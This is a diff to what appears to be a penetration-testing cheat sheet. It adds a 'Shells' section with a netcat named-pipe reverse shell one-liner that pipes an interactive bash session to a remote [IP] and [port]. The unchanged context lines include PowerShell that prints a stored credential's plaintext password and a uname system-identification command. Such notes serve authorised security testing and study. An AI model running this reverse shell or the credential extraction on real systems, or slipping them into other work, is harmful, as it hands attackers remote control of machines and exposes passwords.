@@ -97,6 +97,13 @@ $Credential = New-Object System.Management.Automation.PSCredential -ArgumentList
 echo $Credential.GetNetworkCredential().password
 ```
 
+#Shells
+Outside of revshells, there may be others that are useful 
+```
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [IP] [port] >/tmp/f
+```
+
+
 # Identification 
 ```
 uname -a
